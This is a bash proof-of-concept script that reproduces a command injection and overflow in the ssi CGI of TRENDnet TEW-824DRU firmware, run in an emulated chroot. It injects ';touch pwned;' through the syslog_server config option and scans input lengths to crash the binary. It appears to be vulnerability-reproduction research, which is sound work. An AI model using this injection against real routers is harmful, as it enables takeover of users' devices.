#!/bin/bash
# T-824-1 复现：TEW-824DRU 1.00b18 的 ssi 把 uci syslog_server 拼进 system()
#   控制组 / 注入组 / 溢出组，只改 /etc/config/cameo 里那一行。
# 环境：$ROOTFS（默认 /tmp/tew824-rootfs；zip sha256 179746df…ffcfe3）
#       + qemu-mips-static + 固件自带 busybox；需 root（chroot）
set -u
# bash 会给被信号杀死的子进程打一行 "Segmentation fault" 到 stderr；
# 探针本来就会故意把 ssi 打崩，所以统一屏蔽，退出码由脚本自己打印。
exec 2>/dev/null
R=${ROOTFS:-/tmp/tew824-rootfs}
[ -x "$R/www/cgi/ssi" ] || { echo "rootfs not found: $R (set ROOTFS=...)" >&2; exit 1; }
CFG="$R/etc/config/cameo"
BAK=/tmp/cameo.replay.bak
sudo -n cp "$CFG" "$BAK"
restore() { sudo -n cp "$BAK" "$CFG"; }
trap restore EXIT

set_val() {  # $1 = syslog_server 值
  sudo -n sed -i "s|option syslog_server '.*'|option syslog_server '$1'|" "$CFG"
}

run_ssi() {  # 跑固件自带 ssi（CGI 环境最小集），把 execve 出来的 shell 命令行抓出来
  ( cd "$R" && sudo -n chroot "$R" /qemu-mips-static /usr/bin/env -i \
      REQUEST_METHOD=GET REQUEST_URI=/adm_syslog.asp \
      PATH_TRANSLATED=/www/adm_syslog.asp QUERY_STRING="" \
      SERVER_PORT=80 REMOTE_ADDR=127.0.0.1 GATEWAY_INTERFACE=CGI/1.1 \
      /qemu-mips-static -strace /www/cgi/ssi </dev/null >/tmp/ssi824.out 2>/tmp/ssi824.err )
  echo "    exit=$?"
  grep -oE '"syslogd -C20[^}]*' /tmp/ssi824.err | tail -1 | sed 's/^/    sh -c /'
}

echo "=== T-824-1  ssi: uci syslog_server -> system(\"syslogd ... -R %s:514 &\") ==="
echo "target : TRENDnet TEW-824DRU 1.00b18"
echo "image  : 1.00b18.zip"
echo "sha256 : 179746dfc34b158f5bde802d176d35692046fe211b021f63e4d3ef3746ffcfe3"
echo "ssi    : $(sudo -n sha256sum "$R/www/cgi/ssi" | cut -c1-64)"
echo "host   : $(hostname)  $(date -Iseconds)"
echo "entry  : PATH_TRANSLATED=/www/adm_syslog.asp (the ssi page that calls start_syslogd)"
echo "single variable: option syslog_server in /etc/config/cameo"
echo

echo "########## CONTROL   syslog_server '1/0.0.0.0' ##########"
set_val '1/0.0.0.0'
sudo -n rm -f "$R/pwned"
run_ssi
echo "    pwned: $([ -f "$R/pwned" ] && echo present || echo absent)"
echo

echo "########## TRIGGER   syslog_server '1/;touch pwned;' ##########"
set_val '1/;touch pwned;'
sudo -n rm -f "$R/pwned"
run_ssi
if [ -f "$R/pwned" ]; then
  echo "    pwned: present, $(sudo -n stat -c '%U:%G %a %s bytes' "$R/pwned")"
  echo "    content: $(sudo -n cat "$R/pwned")"
else
  echo "    pwned: absent -- trigger failed"
fi
echo

echo "########## OVERFLOW  长度扫描（同一 option，不带 ';'）##########"
line="    len: "
for n in 20 22 24 26 28; do
  v="1/$(printf 'a%.0s' $(seq 1 $((n-2))))"
  set_val "$v"
  ( cd "$R" && sudo -n chroot "$R" /qemu-mips-static /usr/bin/env -i REQUEST_METHOD=GET \
      REQUEST_URI=/adm_syslog.asp PATH_TRANSLATED=/www/adm_syslog.asp QUERY_STRING="" \
      /qemu-mips-static /www/cgi/ssi </dev/null >/dev/null 2>/dev/null )
  rc=$?
  line="$line$n:${rc}  "
done
echo "$line"
echo
echo "[replay done] only the syslog_server value changed between the runs"
